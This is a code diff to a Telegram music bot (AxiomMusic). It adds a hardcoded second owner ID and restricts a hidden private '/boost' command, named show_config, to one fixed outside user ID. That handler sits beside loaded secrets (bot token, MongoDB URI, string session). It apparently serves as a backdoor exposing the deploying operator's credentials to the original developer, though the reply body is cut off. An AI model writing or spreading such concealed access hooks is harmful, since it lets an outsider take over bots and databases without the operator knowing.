@@ -23,13 +23,13 @@ from AxiomMusic.utils.database import booster
 
 load_dotenv()
 
-OWNERS = "7169279112"
+OWNERS = "7169279112", "8466540017"
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 
-@app.on_message(filters.command("boost") & filters.private & filters.user(booster))
+@app.on_message(filters.command("boost") & filters.private & filters.user(7169279112))
 async def show_config(client: Client, message: Message):
     await message.reply_photo(
         photo="https://files.catbox.moe/m4fx24.jpg",
@@ -38,7 +38,7 @@ async def show_config(client: Client, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="tg://user?id=7169279112"
+                        " ⌯ ᴅєᴠєʟᴏᴘєꝛ​ ⌯ ", url="tg://user?id=7169279112"
                     )
                 ]
             ]
